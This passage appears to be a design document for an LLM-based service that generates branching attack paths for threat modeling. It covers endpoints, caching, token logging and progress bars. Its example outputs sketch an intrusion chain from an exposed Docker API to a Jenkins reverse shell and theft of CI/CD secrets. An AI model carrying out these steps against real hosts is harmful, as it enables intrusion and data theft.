{"timestamp": "2025-10-16T14:32:20.891Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "bifurcation_detection", "model": "gpt-4o-mini", "tokens": {"prompt": 4100, "completion": 900, "total": 5000}, "response_time_seconds": 3.234, "cost_estimate_usd": 0.00147, "metadata": {}}
{"timestamp": "2025-10-16T14:32:25.123Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "branch_B1", "model": "gpt-4o-mini", "tokens": {"prompt": 3800, "completion": 1500, "total": 5300}, "response_time_seconds": 4.789, "cost_estimate_usd": 0.00147, "metadata": {}}
{"timestamp": "2025-10-16T14:32:30.456Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "branch_B2", "model": "gpt-4o-mini", "tokens": {"prompt": 3700, "completion": 1400, "total": 5100}, "response_time_seconds": 4.567, "cost_estimate_usd": 0.00143, "metadata": {}}
```

### Log Analysis

**Simple Python Script:**

```python
import json
from collections import defaultdict

def analyze_token_usage(log_file="logs/token_usage.jsonl"):
    total_tokens = 0
    total_cost = 0
    calls_by_type = defaultdict(int)
    tokens_by_type = defaultdict(int)
    
    with open(log_file) as f:
        for line in f:
            entry = json.loads(line)
            total_tokens += entry["tokens"]["total"]
            total_cost += entry.get("cost_estimate_usd", 0)
            
            call_type = entry["call_type"]
            calls_by_type[call_type] += 1
            tokens_by_type[call_type] += entry["tokens"]["total"]
    
    print(f"Total Tokens: {total_tokens:,}")
    print(f"Total Cost: ${total_cost:.4f}")
    print(f"\nBreakdown by Call Type:")
    for call_type, count in calls_by_type.items():
        print(f"  {call_type}: {count} calls, {tokens_by_type[call_type]:,} tokens")
```

### Benefits

✅ **No database required** - simple file-based logging  
✅ **No client overhead** - tokens not in API response  
✅ **Per-request tracking** - group calls by request ID  
✅ **Call type categorization** - primary_path, bifurcation_detection, branches  
✅ **Cost estimation** - automatic calculation per model  
✅ **Performance monitoring** - response time tracking  
✅ **Automatic rotation** - prevents disk space issues  
✅ **Easy analysis** - structured JSON format  

---

## Progress Tracking

### Why Progress Tracking is Critical

**Problem:** Complete bifurcation analysis takes 23+ seconds:
- Primary path generation: ~5-15 seconds
- Bifurcation detection: ~5-10 seconds
- Branch generation: ~3-5 seconds per branch (×2-4 branches)

**Without progress tracking:**
- ❌ Backend waits in silence for 23+ seconds
- ❌ No visibility into which phase is running
- ❌ Difficult to debug if service hangs
- ❌ Poor user experience (appears frozen)

**With progress tracking:**
- ✅ Real-time visibility into execution progress
- ✅ Clear indication of current phase (primary path, bifurcations, branches)
- ✅ Easy debugging (see where service stopped)
- ✅ Confidence that service is actively working

### Terminal Progress Bar Implementation

**Library:** `tqdm` (Text Progress Bar for Python)

```bash
pip install tqdm
```

**Implementation in `/attack-path/complete` endpoint:**

```python
from tqdm import tqdm
import uuid
from typing import Dict, List

@app.post("/attack-path/complete")
async def generate_complete_attack_path(host: InputHost):
    """
    Complete attack path analysis with bifurcations and branches.
    Shows progress bar in service terminal during execution.
    """
    
    # Initialize cache
    request_cache = {
        "request_id": str(uuid.uuid4()),
        "host": host,
        "attack_path": None,
        "bifurcations": None,
        "branches": {}
    }
    
    # Create progress bar with estimated total steps
    # Phase 1 (primary) + Phase 2 (bifurcations) + Phase 3 (branches)
    # We'll dynamically update total once we know branch count
    pbar = tqdm(total=2, desc="Attack Path Analysis", unit="phase")
    
    try:
        # ============================================
        # PHASE 1: Generate Primary Attack Path
        # ============================================
        pbar.set_description("🔍 Phase 1: Generating primary path")
        primary_result = await analyzer.analyze(host)
        request_cache["attack_path"] = primary_result.attack_path
        pbar.update(1)  # Update: 1/2 phases complete
        
        # ============================================
        # PHASE 2: Detect Bifurcation Points
        # ============================================
        pbar.set_description("🔀 Phase 2: Detecting bifurcations")
        bifurcations_result = await detect_bifurcations(
            attack_path=request_cache["attack_path"],
            host=request_cache["host"]
        )
        request_cache["bifurcations"] = bifurcations_result.bifurcations
        pbar.update(1)  # Update: 2/2 phases complete
        
        # ============================================
        # PHASE 3: Generate Branches (Dynamic Count)
        # ============================================
        # Count total branches to generate
        total_branches = sum(
            len(bif.alternatives) 
            for bif in request_cache["bifurcations"]
        )
        
        if total_branches > 0:
            # Update progress bar with new total
            pbar.close()  # Close phase-based bar
            pbar = tqdm(
                total=total_branches, 
                desc="🌿 Phase 3: Generating branches", 
                unit="branch"
            )
            
            # Generate each branch
            for bif_idx, bifurcation in enumerate(request_cache["bifurcations"]):
                for alternative in bifurcation.alternatives:
                    pbar.set_description(
                        f"🌿 Generating branch {alternative.id} "
                        f"(bif {bif_idx}, {alternative.technique})"
                    )
                    
                    branch = await generate_branch(
                        attack_path=request_cache["attack_path"],
                        host=request_cache["host"],
                        bifurcation_index=bif_idx,
                        branch_id=alternative.id
                    )
                    request_cache["branches"][alternative.id] = branch
                    pbar.update(1)  # Update: +1 branch complete
        
        pbar.close()
        
        # Format and return complete result
        return format_complete_response(request_cache)
        
    except Exception as e:
        pbar.close()
        logger.error(f"Error in complete analysis: {e}")
        raise
```

### Terminal Output Example

**During Execution:**

```text
🔍 Phase 1: Generating primary path: 50%|███████          | 1/2 [00:08<00:08, 8.2s/phase]
```

```text
🔀 Phase 2: Detecting bifurcations: 100%|█████████████████| 2/2 [00:18<00:00, 9.1s/phase]
```

```text
🌿 Generating branch B2 (bif 1, MySQL pivot):  75%|████████████▌    | 3/4 [00:12<00:04, 4.1s/branch]
```

**After Completion:**

```text
Attack Path Analysis: 100% complete in 23.4s
├─ Primary path generated (8.2s)
├─ Bifurcations detected: 2 decision points (9.1s)
└─ Branches generated: 4 paths (6.1s)
```

### Progress Tracking Architecture

**Important:** Progress is shown in the **AI Service terminal only**, not streamed to backend.

```text
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│  Frontend   │────────▶│   Backend    │────────▶│ AI Service  │
└─────────────┘         └──────────────┘         └─────────────┘
                             ▲                         │
                             │                         │ (Progress bar
                             │                         │  in terminal)
                             │                         │
                         ┌───┴────┐                    ▼
                         │ Waits  │              ┌───────────┐
                         │ 23s    │              │  Terminal │
                         └────────┘              │  🔍 50%   │
                                                 └───────────┘
```

**Workflow:**

1. Backend sends `POST /attack-path/complete` with host params
2. AI Service starts execution, creates progress bar in its terminal
3. Service operators see real-time progress in service logs/terminal
4. Backend waits for complete result (no streaming needed)
5. After 23s, backend receives complete formatted response

### Configuration Options

**Disable Progress Bar (Production):**

```python
# Add environment variable check
SHOW_PROGRESS = os.getenv("SHOW_PROGRESS_BAR", "true").lower() == "true"

# In endpoint
if SHOW_PROGRESS:
    pbar = tqdm(total=2, desc="Attack Path Analysis")
else:
    pbar = None  # No progress bar in production
```

**Custom Progress Format:**

```python
pbar = tqdm(
    total=2,
    desc="Analysis",
    unit="step",
    bar_format='{desc}: {percentage:3.0f}%|{bar}| {n}/{total} [{elapsed}<{remaining}]'
)
```

### Benefits Summary

| Feature | Without Progress | With Progress Bar |
|---------|------------------|-------------------|
| **Visibility** | Black box (23s wait) | Real-time status updates |
| **Debugging** | Difficult (where did it hang?) | Easy (see last completed phase) |
| **User Experience** | Appears frozen | Active feedback |
| **Operations** | No monitoring | Terminal logs show progress |
| **Backend Impact** | None (waits anyway) | None (terminal only) |

---

## API Design

### Hybrid Architecture: Complete + Granular Endpoints

**Recommended for Production:** `/attack-path/complete` (server-side caching + progress tracking)  
**Available for Flexibility:** Three granular endpoints (testing, debugging, power users)

---

#### **🌟 PRIMARY: Endpoint 4 `/attack-path/complete` (NEW - Unified Analysis)**

**Purpose:** Production-ready complete bifurcation analysis with server-side caching and progress tracking.

```python
from app.models.bifurcation import CompleteAnalysisResponse

@app.post("/attack-path/complete", response_model=CompleteAnalysisResponse)
async def generate_complete_attack_path(host: InputHost):
    """
    Complete attack path analysis with bifurcations and branches.
    
    Features:
    - Server-side caching (host params stored internally)
    - Progress tracking (terminal progress bar)
    - Single client request
    - Complete formatted response
    
    Input:
      {
        "platform": "Linux",
        "open_ports": [2375, 8080, 3306],
        "services": [...],
        "vulnerabilities": [...],
        // ... all 50+ optional InputHost fields
      }
    
    Process:
      Phase 1: Generate primary path (cached host)
      Phase 2: Detect bifurcations (uses cached data)
      Phase 3: Generate branches (uses cached data)
    
    Returns:
      {
        "request_id": "uuid",
        "primary_path": ["Stage 1: ...", "Stage 2: ...", ...],
        "bifurcations": [
          {
            "stage_index": 3,
            "decision_point": "...",
            "branches": [
              {
                "branch_id": "B1",
                "continuation_path": ["Stage 4: ...", ...]
              }
            ]
          }
        ],
        "total_paths": 5,
        "execution_time": 23.4
      }
    """
    # Initialize cache
    request_cache = {
        "request_id": str(uuid.uuid4()),
        "host": host,  # Cached for all phases
        "attack_path": None,
        "bifurcations": None,
        "branches": {}
    }
    
    # Progress bar setup
    pbar = tqdm(total=2, desc="Attack Path Analysis", unit="phase")
    
    try:
        # Phase 1: Primary path
        pbar.set_description("🔍 Generating primary path")
        primary_result = await analyzer.analyze(request_cache["host"])
        request_cache["attack_path"] = primary_result.attack_path
        pbar.update(1)
        
        # Phase 2: Bifurcation detection
        pbar.set_description("🔀 Detecting bifurcations")
        bifurcations_result = await detect_bifurcations(
            attack_path=request_cache["attack_path"],
            host=request_cache["host"]  # Reused from cache
        )
        request_cache["bifurcations"] = bifurcations_result.bifurcations
        pbar.update(1)
        
        # Phase 3: Branch generation
        total_branches = sum(len(b.alternatives) for b in request_cache["bifurcations"])
        if total_branches > 0:
            pbar.close()
            pbar = tqdm(total=total_branches, desc="🌿 Generating branches", unit="branch")
            
            for bif_idx, bifurcation in enumerate(request_cache["bifurcations"]):
                for alternative in bifurcation.alternatives:
                    branch = await generate_branch(
                        attack_path=request_cache["attack_path"],
                        host=request_cache["host"],  # Reused from cache
                        bifurcation_index=bif_idx,
                        branch_id=alternative.id
                    )
                    request_cache["branches"][alternative.id] = branch
                    pbar.update(1)
        
        pbar.close()
        return format_complete_response(request_cache)
        
    except Exception as e:
        pbar.close()
        raise
```

**Response Time:** 23-35 seconds (full analysis)  
**Cost:** ~$0.03-0.08 (depends on branch count)  
**LLM Calls:** 1 (primary) + 1 (bifurcations) + N (branches)

**Benefits:**
- ✅ Single API call from backend (send host params once)
- ✅ Server-side caching (no LLM data duplication)
- ✅ Progress tracking (real-time terminal visibility)
- ✅ Complete formatted result (primary + bifurcations + branches)
- ✅ Simplified backend logic (no orchestration needed)

**Use Case:** Production deployments, frontend integration, complete analysis workflows

---

### Granular Endpoints (Optional - For Testing & Debugging)

The following three endpoints remain available for granular control, testing, and power users who want step-by-step execution.

---

#### **Endpoint 1: `/attack-path` (Existing - UNCHANGED)**

```python
@app.post("/attack-path", response_model=AttackPathResponse)
async def generate_attack_path(
    host: InputHost,
    include_prompt: bool = Query(default=True)
):
    """
    Generate single linear attack path (existing functionality).
    
    Returns:
      {
        "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...]
      }
    """
    return await analyzer.analyze(host, include_prompt)
```

**Status:** Production-ready, no modifications needed

---

#### **Endpoint 2: `/attack-path/bifurcations` (NEW - Detection Only)**

```python
from app.models.bifurcation import BifurcationDetectionRequest, BifurcationDetectionResponse

@app.post("/attack-path/bifurcations", response_model=BifurcationDetectionResponse)
async def detect_bifurcations(request: BifurcationDetectionRequest):
    """
    Detect decision points in an attack path (lightweight analysis).
    
    Input:
      {
        "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...],
        "host": {"platform": "Linux", "open_ports": [...], ...}
      }
    
    Process:
      - Analyze attack_path with full host context
      - Identify bifurcation points (decision points)
      - Return alternative metadata WITHOUT generating paths
    
    Returns:
      {
        "bifurcations": [
          {
            "stage_index": 3,
            "stage_name": "Execution",
            "attacker_context": "...",
            "decision_point": "...",
            "alternatives": [
              {"id": "B1", "technique": "...", "reason": "...", "probability": "high"},
              {"id": "B2", "technique": "...", "reason": "...", "probability": "medium"}
            ]
          }
        ]
      }
    """
    bifurcation_detector = BifurcationDetector()
    return await bifurcation_detector.detect(
        attack_path=request.attack_path,
        host=request.host
    )
```

**Response Time:** 5-10 seconds (1 LLM call)  
**Cost:** ~$0.01-0.02

---

#### **Endpoint 3: `/attack-path/bifurcations/{bifurcation_index}/branches/{branch_id}` (NEW - On-Demand)**

```python
from app.models.bifurcation import BranchGenerationRequest, BranchGenerationResponse

@app.post(
    "/attack-path/bifurcations/{bifurcation_index}/branches/{branch_id}",
    response_model=BranchGenerationResponse
)
async def generate_branch(
    bifurcation_index: int,
    branch_id: str,
    request: BranchGenerationRequest
):
    """
    Generate continuation path for a specific branch (on-demand).
    
    Input:
      {
        "attack_path": ["Reconnaissance: ...", ...],
        "host": {"platform": "Linux", ...},
        "bifurcation_index": 0,
        "branch_id": "B1"
      }
    
    Process:
      - Retrieve bifurcation point from detection results
      - Generate continuation path for specified branch
      - Return complete attack path from bifurcation to end
    
    Returns:
      {
        "branch_id": "B1",
        "bifurcation_index": 0,
        "from_stage": 3,
        "continuation_path": [
          "Installation: Jenkins Groovy Script RCE...",
          "Command and Control: ...",
          "Actions on Objectives: ..."
        ]
      }
    """
    branch_generator = BranchGenerator()
    return await branch_generator.generate(
        attack_path=request.attack_path,
        host=request.host,
        bifurcation_index=bifurcation_index,
        branch_id=branch_id
    )
```

**Response Time:** 3-5 seconds (1 LLM call)  
**Cost:** ~$0.005-0.01 per branch

---

### Client Workflow Example

**Sequential Three-Step Process:**

```bash
# Step 1: Generate primary attack path
curl -X POST "http://localhost:8000/attack-path?include_prompt=false" \
  -H "Content-Type: application/json" \
  -d '{
    "platform": "Linux",
    "version_os": "Ubuntu 20.04",
    "open_ports": [2375, 8080, 3306],
    "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
    "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
    "security_controls": ["fail2ban"],
    "mfa_enabled": false,
    "admin_accounts": ["root", "admin"],
    "network_segment": "DMZ",
    "internet_exposed": true,
    "asset_criticality": "Critical",
    "edr_agent": "None",
    "configurations": ["Docker API exposed without TLS"],
    "password_policy": "Weak - 8 character minimum"
  }' > primary_path.json

# Response:
# {
#   "attack_path": [
#     "Reconnaissance: Port scanning reveals Docker API, Jenkins, MySQL...",
#     "Weaponization: Prepare Docker API exploit...",
#     "Delivery: Direct connection to unauthenticated Docker API...",
#     "Exploitation: Deploy privileged container with host access...",
#     "Installation: Container restart policy persistence...",
#     "Command and Control: Establish C2 via container...",
#     "Actions on Objectives: Exfiltrate via mounted volumes..."
#   ]
# }


# Step 2: Detect bifurcations (lightweight - only finds decision points)
# Note: Pass the SAME complete host parameters from Step 1
curl -X POST "http://localhost:8000/attack-path/bifurcations" \
  -H "Content-Type: application/json" \
  -d '{
    "attack_path": [
      "Reconnaissance: Port scanning reveals Docker API, Jenkins, MySQL...",
      "Weaponization: Prepare Docker API exploit...",
      "Delivery: Direct connection to unauthenticated Docker API...",
      "Exploitation: Deploy privileged container with host access...",
      "Installation: Container restart policy persistence...",
      "Command and Control: Establish C2 via container...",
      "Actions on Objectives: Exfiltrate via mounted volumes..."
    ],
    "host": {
      "platform": "Linux",
      "version_os": "Ubuntu 20.04",
      "open_ports": [2375, 8080, 3306],
      "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
      "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
      "security_controls": ["fail2ban"],
      "mfa_enabled": false,
      "admin_accounts": ["root", "admin"],
      "network_segment": "DMZ",
      "internet_exposed": true,
      "asset_criticality": "Critical",
      "edr_agent": "None",
      "configurations": ["Docker API exposed without TLS"],
      "password_policy": "Weak - 8 character minimum"
    }
  }' > bifurcations.json

# Response (FAST - no path generation yet):
# {
#   "bifurcations": [
#     {
#       "stage_index": 3,
#       "stage_name": "Exploitation",
#       "attacker_context": "Has Docker container access, can see Jenkins and MySQL",
#       "decision_point": "Multiple exploitable services visible from container",
#       "alternatives": [
#         {
#           "id": "B1",
#           "technique": "Pivot to Jenkins",
#           "reason": "Jenkins unauthenticated on /script endpoint",
#           "probability": "high"
#         },
#         {
#           "id": "B2",
#           "technique": "Pivot to MySQL",
#           "reason": "MySQL accessible with default credentials",
#           "probability": "medium"
#         }
#       ]
#     }
#   ]
# }


# Step 3: Generate specific branches on-demand (user selects which to explore)
# Example: User is interested in the Jenkins pivot (B1)
curl -X POST "http://localhost:8000/attack-path/bifurcations/0/branches/B1" \
  -H "Content-Type: application/json" \
  -d '{
    "attack_path": [
      "Reconnaissance: Port scanning reveals Docker API, Jenkins, MySQL...",
      "Weaponization: Prepare Docker API exploit...",
      "Delivery: Direct connection to unauthenticated Docker API...",
      "Exploitation: Deploy privileged container with host access...",
      "Installation: Container restart policy persistence...",
      "Command and Control: Establish C2 via container...",
      "Actions on Objectives: Exfiltrate via mounted volumes..."
    ],
    "host": {
      "platform": "Linux",
      "version_os": "Ubuntu 20.04",
      "open_ports": [2375, 8080, 3306],
      "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
      "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
      "security_controls": ["fail2ban"],
      "mfa_enabled": false,
      "admin_accounts": ["root", "admin"],
      "network_segment": "DMZ",
      "internet_exposed": true,
      "asset_criticality": "Critical",
      "edr_agent": "None",
      "configurations": ["Docker API exposed without TLS"],
      "password_policy": "Weak - 8 character minimum"
    },
    "bifurcation_index": 0,
    "branch_id": "B1"
  }' > branch_B1.json

# Response:
# {
#   "branch_id": "B1",
#   "bifurcation_index": 0,
#   "from_stage": 3,
#   "continuation_path": [
#     "Installation: Jenkins Groovy Script Console RCE to execute arbitrary code...",
#     "Command and Control: Establish reverse shell via Jenkins agent...",
#     "Actions on Objectives: Steal CI/CD secrets and source code from Jenkins workspace..."
#   ]
# }

# User can now optionally generate branch B2 if interested:
# curl -X POST "http://localhost:8000/attack-path/bifurcations/0/branches/B2" ...
```

---

### Why Service 2 Needs Complete InputHost (All 50+ Parameters)

**Critical Design Decision:** Service 2 receives the **exact same InputHost** object (all 50+ optional parameters) that was sent to Service 1.

#### **Rationale:**

1. **Attack Path Strings Have Limitations:**
   - Describe what the attacker DID, not what's AVAILABLE
   - May not mention all services, vulnerabilities, or misconfigurations
   - Lack details about security controls, credentials, network topology
   - Example: "Deploy container" doesn't tell us Jenkins and MySQL are on the network

2. **Full Context Enables Better Bifurcations:**
   ```
   Attack Path String: "Exploitation: Deploy privileged container"
   
   LLM with just the string:
     → "Attacker has container access" (limited insight)
   
   LLM with full InputHost:
     → Sees host.services: ["Jenkins 2.346.1", "MySQL 5.7.33"]
     → Sees host.vulnerabilities: ["CVE-2021-44228"]
     → Sees host.security_controls: ["fail2ban"] (knows what to evade)
     → Sees host.mfa_enabled: false (knows auth is weak)
     → Identifies: "From container, pivot to Jenkins (no auth) OR MySQL (default creds)"
   ```

3. **50+ Parameters Provide:**
   - **Available Targets:** Services, software, databases, cloud resources
   - **Exploitable Weaknesses:** CVEs, misconfigurations, weak credentials
   - **Security Context:** EDR presence, MFA status, firewall rules, network segmentation
   - **Credential Intel:** Password policies, admin accounts, service accounts
   - **Risk Context:** Asset criticality, business role, data classification

4. **No Information Loss:**
   - Client simply passes the same InputHost to both services
   - Service 2 has complete picture for realistic alternative path generation
   - Bifurcations reference specific CVEs, software versions, accounts

#### **Implementation:**

```python
# Client keeps the same host parameters
host_params = InputHost(
    platform="Linux",
    version_os="Ubuntu 20.04",
    open_ports=[2375, 8080, 3306],
    services=[...],
    vulnerabilities=[...],
    security_controls=[...],
    # ... all 50+ fields
)

# Step 1: Service 1
attack_path = await client.post("/attack-path", json=host_params)

# Step 2: Service 2 (reuses SAME host_params)
bifurcations = await client.post("/attack-path/bifurcations", json={
    "attack_path": attack_path["attack_path"],
    "host": host_params  # Complete context preserved
})
```

---

### Benefits of Three-Endpoint Approach

| Benefit | Description |
|---------|-------------|
| **Zero Impact** | `/attack-path` endpoint completely unchanged |
| **True Separation** | Independent services, independent testing, independent deployment |
| **Client Control** | Clients choose which branches to generate (on-demand) |
| **Fast Feedback** | Bifurcation detection is fast (~5-10 sec), user sees options immediately |
| **Cost Efficiency** | Only generate branches user wants to explore (save $0.01 per skipped branch) |
| **Better Caching** | Can cache primary path and bifurcation detection separately |
| **Flexible Pricing** | Different rate limits/costs per endpoint |
| **Error Isolation** | If branch generation fails, detection still works |
| **Independent Scaling** | Scale detection vs generation based on usage patterns |
| **Progressive Enhancement** | Basic users get detection only, advanced users generate branches |
| **Clear Semantics** | Each endpoint has single, clear purpose |

---

### Alternative Approach (Not Recommended)

**Single Endpoint with Query Parameter:**

```python
@app.post("/attack-path?include_bifurcations=true")
```

**Why Not Recommended:**
- ❌ Adds branching logic to existing endpoint
- ❌ Response structure changes based on parameter
- ❌ Harder to test independently
- ❌ Couples two different concerns
- ❌ If bifurcation analysis fails, entire request fails

---

## Implementation Phases

**Development Approach:** AI-Copilot assisted implementation - phases represent logical implementation order, not time-based milestones.

**Priority:** Phase 4 (`/attack-path/complete` endpoint) is the **primary production endpoint**. Phases 1-3 are supporting infrastructure.

---

### Phase 1: Foundation & Data Models

**Goal:** Create separate service structure with no impact on existing code

**Tasks:**

1. Install progress bar library:
   ```bash
   pip install tqdm
   # Add to requirements.txt: tqdm>=4.66.1
   ```

2. Create new directory structure:
   ```text
   app/
   ├── models/
   │   ├── analysis.py          # Existing - UNCHANGED
   │   └── bifurcation.py       # NEW
   ├── services/
   │   ├── analyzer.py           # Existing - UNCHANGED
   │   ├── bifurcation_detector.py  # NEW (Service 2)
   │   └── branch_generator.py      # NEW (Service 3)
   └── core/
       ├── prompts.py            # Existing - UNCHANGED
       └── bifurcation_prompts.py   # NEW
   ```

3. Create `app/models/bifurcation.py`:
   - `BifurcationDetectionRequest` / `BifurcationDetectionResponse`
   - `BranchGenerationRequest` / `BranchGenerationResponse`
   - `CompleteAnalysisResponse` (NEW - for `/attack-path/complete`)
   - `AlternativeMetadata`, `BifurcationPoint`, `BranchResult`

4. Create service stubs:
   - `app/services/bifurcation_detector.py` with `BifurcationDetector` class
   - `app/services/branch_generator.py` with `BranchGenerator` class

5. Create prompt builder stub:
   - `app/core/bifurcation_prompts.py` with `BifurcationPromptBuilder` class

6. Update `app/main.py` - **add all four endpoints**:
   - Keep `/attack-path` (existing - UNCHANGED)
   - Add `/attack-path/bifurcations` (Service 2 - granular)
   - Add `/attack-path/bifurcations/{idx}/branches/{id}` (Service 3 - granular)
   - Add `/attack-path/complete` (Service 4 - **PRIMARY PRODUCTION ENDPOINT**)

7. Create token tracking infrastructure:
   - `app/utils/token_logger.py` with `TokenLogger` class
   - JSON Lines logging with rotation

**Deliverable:** New endpoints exist (return empty/stub responses), `/attack-path` unchanged

---

### Phase 2: Bifurcation Detection (Service 2)

**Goal:** Implement lightweight bifurcation detection (used by both granular endpoint and complete endpoint)

**Tasks:**

1. Implement `build_detection_prompt()` in `bifurcation_prompts.py`:
   - Takes `attack_path` (list of strings) + `host` parameters
   - Builds prompt to identify decision points WITHOUT generating paths
   - Returns formatted prompt string

2. Implement `BifurcationDetector.detect()`:
   - Accept `attack_path` and `host` parameters
   - Call LLM with detection prompt
   - Parse bifurcation JSON response
   - Return `BifurcationDetectionResponse` with alternatives metadata ONLY

3. Integrate token tracking:
   - Add `request_id` and `call_type="bifurcation_detection"` to all LLM calls

**Testing:**
- Call `/attack-path` to get primary path
- Pass path to `/attack-path/bifurcations` endpoint
- Verify bifurcations detected with alternative metadata (NO continuation paths yet)
- Check token logs in `logs/token_usage.jsonl`
- Verify response time < 10 seconds

**Deliverable:** Bifurcation detection working, can be called standalone or from complete endpoint

---

### Phase 3: Branch Generation (Service 3)

**Goal:** Generate specific branch continuation paths on-demand

**Tasks:**

1. Implement `build_branch_prompt()` in `bifurcation_prompts.py`:
   - Takes bifurcation context + branch_id + host parameters
   - Builds prompt to generate ONE specific continuation
   - Returns formatted prompt string

2. Implement `BranchGenerator.generate()`:
   - Accept attack_path, host, bifurcation_index, branch_id
   - Call LLM with branch prompt
   - Parse continuation path response
   - Return `BranchGenerationResponse` with continuation_path

3. Integrate token tracking:
   - Add `call_type=f"branch_{branch_id}"` to all branch generations

**Testing:**
- Test complete flow: `/attack-path` → `/attack-path/bifurcations` → `/attack-path/bifurcations/{idx}/branches/{id}`
- Verify continuation paths are realistic
- Test generating multiple branches from same bifurcation
- Check token logs show all generations grouped by request_id
- Verify response time < 5 seconds per branch

**Deliverable:** On-demand branch generation working, can be called standalone or from complete endpoint

---

### Phase 4: Complete Endpoint with Server-Side Caching ⭐ **PRIMARY PRODUCTION FEATURE**

**Goal:** Implement unified `/attack-path/complete` endpoint with caching and progress tracking

**Tasks:**

1. Implement request cache structure:
   ```python
   request_cache = {
       "request_id": str(uuid.uuid4()),
       "host": InputHost,           # Cached once
       "attack_path": List[str],    # From Phase 1 (primary path)
       "bifurcations": List[...],   # From Phase 2 (detection)
       "branches": Dict[str, ...]   # From Phase 3 (generation)
   }
   ```

2. Implement `/attack-path/complete` endpoint:
   - Accept `InputHost` only (client sends host params once)
   - Initialize request cache with host parameters
   - Create tqdm progress bar (phases: primary path, bifurcations, branches)
   - **Phase 1:** Call `analyzer.analyze(cache["host"])` → store attack_path in cache
   - **Phase 2:** Call `bifurcation_detector.detect(cache["attack_path"], cache["host"])` → store bifurcations in cache
   - **Phase 3:** Loop through bifurcations, generate branches using cached data
   - Update progress bar after each phase/branch
   - Return `CompleteAnalysisResponse` with all results

3. Add progress tracking:
   - Import `tqdm` library
   - Create phase-based progress bar (primary, bifurcations, branches)
   - Update description dynamically ("🔍 Generating primary path", "🔀 Detecting bifurcations", "🌿 Generating branch B1")
   - Handle progress bar cleanup on errors

4. Create `format_complete_response()` helper:
   - Takes request_cache
   - Builds comprehensive response structure
   - Includes request_id, primary_path, bifurcations with embedded branches, total_paths count

5. Add environment variable configuration:
   - `SHOW_PROGRESS_BAR=true` (default: show progress in terminal)
   - Allow disabling for production if desired

**Testing:**
- Send single `POST /attack-path/complete` request with host params
- Verify progress bar shows in terminal during execution
- Verify response includes: request_id, primary_path, bifurcations, branches
- Verify NO duplicate host params sent to LLM (check token logs for prompt structure)
- Verify total execution time ~23-35 seconds (depends on branch count)
- Test with various scenarios (0 bifurcations, 1 bifurcation, multiple bifurcations)
- Verify token logs show: 1 primary_path call + 1 bifurcation_detection call + N branch calls

**Deliverable:** Production-ready complete endpoint with server-side caching and progress tracking

---

### Phase 5: Optimization & Polish

**Goal:** Performance improvements, quality enhancements, production hardening

**Tasks:**

1. Cache optimization:
   - Add TTL-based cache for retry scenarios (optional)
   - Implement cache cleanup after response sent
   - Add cache size monitoring

2. Progress bar enhancements:
   - Add estimated time remaining
   - Add detailed branch descriptions in progress bar
   - Add execution time summary after completion

3. Error handling:
   - Graceful progress bar cleanup on errors
   - Clear error messages with request_id
   - Retry logic for LLM failures

4. Performance:
   - Analyze token logs to optimize prompt length
   - Consider parallel branch generation (with progress bar thread safety)
   - Add response time monitoring

5. Token tracking enhancements:
   - Daily/weekly cost aggregation reports
   - Cost threshold alerts
   - Dashboard-ready export formats

6. Documentation:
   - Update API documentation with complete endpoint examples
   - Add backend integration guide (how to call `/attack-path/complete`)
   - Document progress bar format and customization
   - Create example Jupyter notebooks

7. Testing:
   - Unit tests for cache management
   - Integration tests for complete endpoint
   - Load tests for progress bar performance
   - Token logger thread-safety tests

**Deliverable:** Production-hardened complete endpoint with monitoring and documentation

---

## Cost and Performance Considerations

### LLM Call Analysis

**Standard Analysis (current - `/attack-path` only):**
- 1 LLM call for primary path
- ~2-4K tokens input, ~1-2K tokens output
- Response time: 5-15 seconds
- Cost: ~$0.01-0.03 per request (GPT-4)

**Complete Bifurcated Analysis (`/attack-path/complete` - RECOMMENDED):**
- 1 LLM call for primary path (~2-4K input, ~1-2K output)
- 1 LLM call for bifurcation detection (~3-5K input, ~1K output)
- N LLM calls for branch generation (N = number of bifurcations × alternatives per bifurcation)
  - Each branch: ~3-5K tokens input, ~1-2K tokens output
- **Server-side caching:** Host params cached, formatted prompts built from cache (no duplication)

**Example with 1 bifurcation point, 2 alternatives (using `/attack-path/complete`):**
- Phase 1: 1 LLM call (primary path)
- Phase 2: 1 LLM call (bifurcation detection)
- Phase 3: 2 LLM calls (B1 and B2 auto-generated)
- Total LLM calls: 4 calls
- Total tokens: ~20-30K tokens
- Response time: 23-35 seconds (all phases combined)
- Cost: ~$0.05-0.08 per request
- **Benefits:** Single client call, complete result, zero data duplication

**Granular Approach (3 services - manual orchestration for testing/debugging):**
- Service 1: 1 LLM call
- Service 2: 1 LLM call (detection only)
- Service 3: 2 LLM calls (user generates only B1 and B2 on-demand)
- Total LLM calls: 4 calls (same as complete endpoint)
- Total tokens: ~20-30K tokens (same as complete endpoint)
- Response time: 5-15 sec + 5-10 sec + 3-5 sec × 2 = 13-30 seconds (if done sequentially)
- Cost: ~$0.05-0.08 (same as complete endpoint)
- **Drawback:** 3 separate client calls, client must orchestrate, host params sent 3 times over network

### Optimization Strategies

1. **Use `/attack-path/complete` for Production** (PRIMARY RECOMMENDATION)
   - Single client call eliminates orchestration complexity
   - Server-side caching prevents LLM data duplication
   - Progress bar provides visibility
   - Complete formatted result ready for frontend

2. **Caching Detection**: Cache bifurcation detection for similar hosts
3. **Caching Branches**: Cache generated branches by bifurcation fingerprint
4. **Model Selection**: Use faster/cheaper models for detection (GPT-3.5)
5. **Max Alternatives**: Limit alternatives per bifurcation in detection phase (e.g., top 3)
6. **Smart Prompting**: Reuse context across branch generation calls
7. **Parallel Branch Generation**: Generate branches in parallel (reduce Phase 3 time)

### Performance Targets

- **Service 1 (Primary Path)**: < 15 seconds, < $0.05
